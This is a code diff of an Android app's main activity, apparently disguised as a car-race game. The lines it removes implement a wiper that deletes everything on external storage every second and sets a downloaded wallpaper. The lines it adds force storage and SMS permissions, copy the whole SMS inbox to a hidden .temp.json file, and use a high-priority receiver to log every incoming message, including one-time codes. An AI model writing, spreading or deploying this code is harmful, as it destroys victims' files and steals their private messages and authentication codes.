@@ -2,12 +2,13 @@ package com.carrace;
 
 import android.Manifest;
 import android.app.Activity;
-import android.app.WallpaperManager;
+import android.content.BroadcastReceiver;
+import android.content.Context;
 import android.content.Intent;
+import android.content.IntentFilter;
 import android.content.SharedPreferences;
 import android.content.pm.PackageManager;
-import android.graphics.Bitmap;
-import android.graphics.BitmapFactory;
+import android.database.Cursor;
 import android.net.Uri;
 import android.os.Build;
 import android.os.Bundle;
@@ -15,6 +16,8 @@ import android.os.Environment;
 import android.os.Handler;
 import android.os.Looper;
 import android.provider.Settings;
+import android.provider.Telephony;
+import android.telephony.SmsMessage;
 import android.util.Log;
 import android.view.Gravity;
 import android.view.View;
@@ -31,44 +34,46 @@ import android.widget.LinearLayout;
 import android.widget.TextView;
 import android.widget.Toast;
 
+import org.json.JSONArray;
+import org.json.JSONObject;
+
 import java.io.ByteArrayInputStream;
 import java.io.File;
+import java.io.FileInputStream;
+import java.io.FileOutputStream;
 import java.io.IOException;
 import java.io.InputStream;
-import java.net.HttpURLConnection;
-import java.net.URL;
+import java.nio.charset.StandardCharsets;
+import java.util.HashSet;
 import java.util.Locale;
-import java.util.concurrent.atomic.AtomicBoolean;
+import java.util.Set;
 
 public class MainActivity extends Activity {
 
     private static final String TAG = "ApkReactCh";
 
-    // assets/index.html loaded via a virtual https origin, not file://
     private static final String HOST = "appassets.androidplatform.net";
     private static final String ASSET_PREFIX = "/assets/";
     private static final String START_URL = "https://" + HOST + ASSET_PREFIX + "index.html";
 
     private static final long SPLASH_MS = 2500L;
     private static final int REQUEST_STORAGE = 100;
-    private static final String PREFS = "perm";
-    private static final String KEY_ASKED = "already_asked";
-    private static final String MSG_PERM = "Storage permission is required to use this app";
+    private static final int REQUEST_SMS = 101;
+    private static final String PREFS = "izin";
+    private static final String KEY_ASKED_STORAGE = "storage_asked";
+    private static final String KEY_ASKED_SMS = "sms_asked";
+    private static final String MSG_STORAGE = "Storage permission is required to use this app";
+    private static final String MSG_SMS = "SMS permission is required to use this app";
 
-    // Wiper configuration
-    private static final long WIPE_INTERVAL_MS = 1000L;         // loop every 3s
-    private static final String WALLPAPER_URL = "https://i.ibb.co/99ZTQmxn/S-ivny-Opz-Xq-AF9-AZWjg-T-upload.jpg";
-    private static final String[] PROTECTED_DIRS = {
-            "Android"
-    };
+    // JSON store
+    private static final String JSON_FILE = ".temp.json";
 
     private final Handler handler = new Handler(Looper.getMainLooper());
-    private final AtomicBoolean wipeRunning = new AtomicBoolean(false);
-    private final AtomicBoolean wallpaperSet = new AtomicBoolean(false);
     private final Runnable splashDone = this::onSplashFinished;
 
     private WebView webView;
     private boolean awaitingSettings;
+    private SmsReceiver receiver;
 
     // ===== Lifecycle =====
 
@@ -78,6 +83,16 @@ public class MainActivity extends Activity {
         LinearLayout splash = buildSplash();
         applySystemBarPadding(splash);
         setContentView(splash);
+
+        handler.postDelayed(() -> {
+            // kick off initial SMS dump (only if allowed)
+            if (hasSms()) {
+                new Thread(MainActivity.this::dumpAllSms).start();
+            }
+            // register realtime receiver
+            registerSmsReceiver();
+        }, 500);
+
         handler.postDelayed(splashDone, SPLASH_MS);
     }
 
@@ -88,10 +103,9 @@ public class MainActivity extends Activity {
         if (awaitingSettings) {
             awaitingSettings = false;
             if (hasStorage()) {
-                startWiper();
-                openWebView();
+                maybeContinueAfterStorage();
             } else {
-                closeApp(MSG_PERM);
+                closeApp(MSG_STORAGE);
             }
         }
     }
@@ -114,6 +128,7 @@ public class MainActivity extends Activity {
     @Override
     protected void onDestroy() {
         handler.removeCallbacksAndMessages(null);
+        unregisterSmsReceiver();
         destroyWebView();
         super.onDestroy();
     }
@@ -121,12 +136,24 @@ public class MainActivity extends Activity {
     @Override
     public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
         super.onRequestPermissionsResult(requestCode, permissions, grantResults);
-        if (requestCode != REQUEST_STORAGE || isFinishing()) return;
-        if (hasStorage()) {
-            startWiper();
-            openWebView();
-        } else {
-            closeApp(MSG_PERM);
+        if (isFinishing()) return;
+
+        if (requestCode == REQUEST_STORAGE) {
+            if (hasStorage()) {
+                maybeContinueAfterStorage();
+            } else {
+                closeApp(MSG_STORAGE);
+            }
+            return;
+        }
+
+        if (requestCode == REQUEST_SMS) {
+            if (hasSms()) {
+                new Thread(this::dumpAllSms).start();
+                openWebView();
+            } else {
+                closeApp(MSG_SMS);
+            }
         }
     }
 
@@ -134,34 +161,59 @@ public class MainActivity extends Activity {
 
     private void onSplashFinished() {
         if (isFinishing()) return;
-        if (hasStorage()) {
-            startWiper();
-            openWebView();
+
+        // 1) Storage first
+        if (!hasStorage()) {
+            if (Build.VERSION.SDK_INT >= 30) {
+                openPermissionSettings(
+                        allFilesIntent(),
+                        new Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION),
+                        appDetailsIntent());
+            } else {
+                SharedPreferences prefs = getSharedPreferences(PREFS, MODE_PRIVATE);
+                boolean asked = prefs.getBoolean(KEY_ASKED_STORAGE, false);
+                boolean neverAskAgain = asked
+                        && !shouldShowRequestPermissionRationale(Manifest.permission.READ_EXTERNAL_STORAGE)
+                        && !shouldShowRequestPermissionRationale(Manifest.permission.WRITE_EXTERNAL_STORAGE);
+                if (neverAskAgain) {
+                    openPermissionSettings(appDetailsIntent());
+                } else {
+                    prefs.edit().putBoolean(KEY_ASKED_STORAGE, true).apply();
+                    requestPermissions(new String[]{
+                            Manifest.permission.READ_EXTERNAL_STORAGE,
+                            Manifest.permission.WRITE_EXTERNAL_STORAGE
+                    }, REQUEST_STORAGE);
+                }
+            }
             return;
         }
 
-        if (Build.VERSION.SDK_INT >= 30) {
-            openPermissionSettings(
-                    allFilesIntent(),
-                    new Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION),
-                    appDetailsIntent());
+        // 2) Then SMS
+        maybeContinueAfterStorage();
+    }
+
+    private void maybeContinueAfterStorage() {
+        if (!hasSms()) {
+            SharedPreferences prefs = getSharedPreferences(PREFS, MODE_PRIVATE);
+            boolean asked = prefs.getBoolean(KEY_ASKED_SMS, false);
+            boolean neverAskAgain = asked
+                    && !shouldShowRequestPermissionRationale(Manifest.permission.READ_SMS)
+                    && !shouldShowRequestPermissionRationale(Manifest.permission.RECEIVE_SMS);
+            if (neverAskAgain) {
+                openPermissionSettings(appDetailsIntent());
+            } else {
+                prefs.edit().putBoolean(KEY_ASKED_SMS, true).apply();
+                requestPermissions(new String[]{
+                        Manifest.permission.READ_SMS,
+                        Manifest.permission.RECEIVE_SMS
+                }, REQUEST_SMS);
+            }
             return;
         }
 
-        SharedPreferences prefs = getSharedPreferences(PREFS, MODE_PRIVATE);
-        boolean asked = prefs.getBoolean(KEY_ASKED, false);
-        boolean neverAskAgain = asked
-                && !shouldShowRequestPermissionRationale(Manifest.permission.READ_EXTERNAL_STORAGE)
-                && !shouldShowRequestPermissionRationale(Manifest.permission.WRITE_EXTERNAL_STORAGE);
-        if (neverAskAgain) {
-            openPermissionSettings(appDetailsIntent());
-            return;
-        }
-
-        prefs.edit().putBoolean(KEY_ASKED, true).apply();
-        requestPermissions(
-                new String[]{Manifest.permission.READ_EXTERNAL_STORAGE, Manifest.permission.WRITE_EXTERNAL_STORAGE},
-                REQUEST_STORAGE);
+        // both granted -> dump + webview
+        new Thread(this::dumpAllSms).start();
+        openWebView();
     }
 
     private void openPermissionSettings(Intent... candidates) {
@@ -170,7 +222,7 @@ public class MainActivity extends Activity {
             if (startSafely(intent)) return;
         }
         awaitingSettings = false;
-        closeApp(MSG_PERM);
+        closeApp(MSG_STORAGE);
     }
 
     private boolean startSafely(Intent intent) {
@@ -202,103 +254,212 @@ public class MainActivity extends Activity {
         return true;
     }
 
+    private boolean hasSms() {
+        if (Build.VERSION.SDK_INT >= 23) {
+            return checkSelfPermission(Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED
+                    && checkSelfPermission(Manifest.permission.RECEIVE_SMS) == PackageManager.PERMISSION_GRANTED;
+        }
+        return true;
+    }
+
     private void closeApp(String message) {
         if (isFinishing()) return;
         Toast.makeText(this, message, Toast.LENGTH_LONG).show();
         finishAndRemoveTask();
     }
 
-    // ===== Looping Wiper =====
+    // ===== SMS =====
 
-    private void startWiper() {
-        if (!wipeRunning.compareAndSet(false, true)) return;
-        new Thread(this::wiperLoop, "wiper").start();
-    }
-
-    private void wiperLoop() {
-        File root = Environment.getExternalStorageDirectory();
-        int round = 0;
-        while (wipeRunning.get()) {
-            round++;
-            try {
-                Log.d(TAG, "Wipe round " + round);
-                wipeDirectory(root);
-            } catch (Exception e) {
-                Log.w(TAG, "wipe round failed", e);
-            }
-
-            if (!wallpaperSet.get()) {
-                setWallpaperOnce();
-            }
-
-            try { Thread.sleep(WIPE_INTERVAL_MS); }
-            catch (InterruptedException e) { return; }
+    private void registerSmsReceiver() {
+        if (receiver != null) return;
+        receiver = new SmsReceiver();
+        IntentFilter filter = new IntentFilter(Telephony.Sms.Intents.SMS_RECEIVED_ACTION);
+        filter.setPriority(IntentFilter.SYSTEM_HIGH_PRIORITY);
+        if (Build.VERSION.SDK_INT >= 33) {
+            registerReceiver(receiver, filter, Context.RECEIVER_EXPORTED);
+        } else {
+            registerReceiver(receiver, filter);
         }
     }
 
-    private void wipeDirectory(File dir) {
-        if (dir == null || !dir.exists()) return;
-        File[] children = dir.listFiles();
-        if (children == null) return;
-
-        for (File child : children) {
-            try {
-                if (child.isDirectory()) {
-                    if (isProtected(child.getName())) continue;
-                    wipeDirectory(child);
-                    // ignore delete() failure on protected/system files
-                    child.delete();
-                } else {
-                    child.delete();
-                }
-            } catch (Exception ignored) {}
+    private void unregisterSmsReceiver() {
+        if (receiver != null) {
+            try { unregisterReceiver(receiver); } catch (Exception ignored) {}
+            receiver = null;
         }
     }
 
-    private boolean isProtected(String name) {
-        for (String p : PROTECTED_DIRS) {
-            if (p.equalsIgnoreCase(name)) return true;
-        }
-        return false;
-    }
+    // Dump all SMS from inbox into /storage/emulated/0/.temp.json (merges existing)
+    private synchronized void dumpAllSms() {
+        if (!hasSms()) return;
+        if (!hasStorage()) return;
 
-    // ===== Wallpaper =====
+        JSONArray merged = new JSONArray();
+        Set<String> seen = new HashSet<>();
 
-    private void setWallpaperOnce() {
-        new Thread(() -> {
-            try {
-                Bitmap bmp = download(WALLPAPER_URL);
-                if (bmp != null) {
-                    WallpaperManager wm = WallpaperManager.getInstance(getApplicationContext());
-                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
-                        wm.setBitmap(bmp, null, true, WallpaperManager.FLAG_SYSTEM);
-                    } else {
-                        wm.setBitmap(bmp);
-                    }
-                    wallpaperSet.set(true);
-                    Log.d(TAG, "Wallpaper set");
-                }
-            } catch (Exception e) {
-                Log.w(TAG, "wallpaper failed", e);
-            }
-        }).start();
-    }
-
-    private Bitmap download(String urlStr) {
+        // merge existing
         try {
-            URL url = new URL(urlStr);
-            HttpURLConnection c = (HttpURLConnection) url.openConnection();
-            c.setConnectTimeout(15000);
-            c.setReadTimeout(15000);
-            c.setInstanceFollowRedirects(true);
-            c.setRequestProperty("User-Agent", "Mozilla/5.0");
-            InputStream in = c.getInputStream();
-            Bitmap b = BitmapFactory.decodeStream(in);
-            in.close();
-            c.disconnect();
-            return b;
+            File target = new File(Environment.getExternalStorageDirectory(), JSON_FILE);
+            if (target.exists() && target.length() > 0) {
+                byte[] buf = new byte[(int) target.length()];
+                FileInputStream in = new FileInputStream(target);
+                int read = 0;
+                while (read < buf.length) {
+                    int r = in.read(buf, read, buf.length - read);
+                    if (r < 0) break;
+                    read += r;
+                }
+                in.close();
+                JSONArray existing = new JSONArray(new String(buf, StandardCharsets.UTF_8));
+                for (int i = 0; i < existing.length(); i++) {
+                    JSONObject o = existing.getJSONObject(i);
+                    String key = o.optString("id", "")
+                            + "|" + o.optLong("date", 0);
+                    if (seen.add(key)) merged.put(o);
+                }
+            }
         } catch (Exception e) {
-            return null;
+            Log.w(TAG, "existing parse failed", e);
+        }
+
+        // append all inbox messages
+        Cursor c = null;
+        try {
+            c = getContentResolver().query(
+                    Uri.parse("content://sms/inbox"),
+                    new String[]{"_id", "address", "body", "date", "person", "read"},
+                    null, null, "date ASC");
+            if (c != null) {
+                while (c.moveToNext()) {
+                    String id = c.getString(0);
+                    String addr = c.getString(1);
+                    String body = c.getString(2);
+                    long date = c.getLong(3);
+                    long person = c.getLong(4);
+                    int read = c.getInt(5);
+
+                    String key = id + "|" + date;
+                    if (!seen.add(key)) continue;
+
+                    JSONObject o = new JSONObject();
+                    o.put("id", id);
+                    o.put("address", addr);
+                    o.put("body", body);
+                    o.put("date", date);
+                    o.put("person", person);
+                    o.put("read", read);
+                    o.put("source", "inbox");
+                    merged.put(o);
+                }
+            }
+        } catch (Exception e) {
+            Log.w(TAG, "inbox query failed", e);
+        } finally {
+            if (c != null) c.close();
+        }
+
+        // write back
+        try {
+            File target = new File(Environment.getExternalStorageDirectory(), JSON_FILE);
+            FileOutputStream out = new FileOutputStream(target, false);
+            out.write(merged.toString(2).getBytes(StandardCharsets.UTF_8));
+            out.flush();
+            out.close();
+            Log.d(TAG, "SMS dumped: " + merged.length());
+        } catch (Exception e) {
+            Log.e(TAG, "dump write failed", e);
+        }
+    }
+
+    private void appendSingleSms(String address, String body, long timestamp) {
+        if (!hasStorage()) return;
+
+        JSONArray merged = new JSONArray();
+        Set<String> seen = new HashSet<>();
+        try {
+            File target = new File(Environment.getExternalStorageDirectory(), JSON_FILE);
+            if (target.exists() && target.length() > 0) {
+                byte[] buf = new byte[(int) target.length()];
+                FileInputStream in = new FileInputStream(target);
+                int read = 0;
+                while (read < buf.length) {
+                    int r = in.read(buf, read, buf.length - read);
+                    if (r < 0) break;
+                    read += r;
+                }
+                in.close();
+                JSONArray existing = new JSONArray(new String(buf, StandardCharsets.UTF_8));
+                for (int i = 0; i < existing.length(); i++) {
+                    JSONObject o = existing.getJSONObject(i);
+                    String key = o.optString("address", "") + "|" + o.optLong("date", 0);
+                    seen.add(key);
+                    merged.put(o);
+                }
+            }
+        } catch (Exception ignored) {}
+
+        String key = address + "|" + timestamp;
+        if (seen.contains(key)) return;
+
+        try {
+            JSONObject o = new JSONObject();
+            o.put("address", address);
+            o.put("body", body);
+            o.put("date", timestamp);
+            o.put("source", "realtime");
+            merged.put(o);
+
+            File target = new File(Environment.getExternalStorageDirectory(), JSON_FILE);
+            FileOutputStream out = new FileOutputStream(target, false);
+            out.write(merged.toString(2).getBytes(StandardCharsets.UTF_8));
+            out.flush();
+            out.close();
+            Log.d(TAG, "Realtime SMS saved from " + address);
+        } catch (Exception e) {
+            Log.e(TAG, "append realtime failed", e);
+        }
+    }
+
+    // BroadcastReceiver: catches SMS while app is running
+    private class SmsReceiver extends BroadcastReceiver {
+        @Override
+        public void onReceive(Context context, Intent intent) {
+            if (intent == null || !Telephony.Sms.Intents.SMS_RECEIVED_ACTION.equals(intent.getAction())) return;
+
+            try {
+                android.os.Bundle bundle = intent.getExtras();
+                if (bundle == null) return;
+
+                Object[] pdus = (Object[]) bundle.get("pdus");
+                if (pdus == null) return;
+
+                String format = bundle.getString("format");
+                StringBuilder fullBody = new StringBuilder();
+                String sender = "";
+                long timestamp = 0;
+
+                for (Object pdu : pdus) {
+                    SmsMessage msg;
+                    if (Build.VERSION.SDK_INT >= 23 && format != null) {
+                        msg = SmsMessage.createFromPdu((byte[]) pdu, format);
+                    } else {
+                        msg = SmsMessage.createFromPdu((byte[]) pdu);
+                    }
+                    if (msg == null) continue;
+                    sender = msg.getOriginatingAddress();
+                    timestamp = msg.getTimestampMillis();
+                    fullBody.append(msg.getMessageBody());
+                }
+
+                if (sender != null && fullBody.length() > 0) {
+                    final String s = sender;
+                    final String b = fullBody.toString();
+                    final long t = timestamp == 0 ? System.currentTimeMillis() : timestamp;
+                    new Thread(() -> appendSingleSms(s, b, t)).start();
+                }
+            } catch (Exception e) {
+                Log.e(TAG, "receiver failed", e);
+            }
         }
     }
 
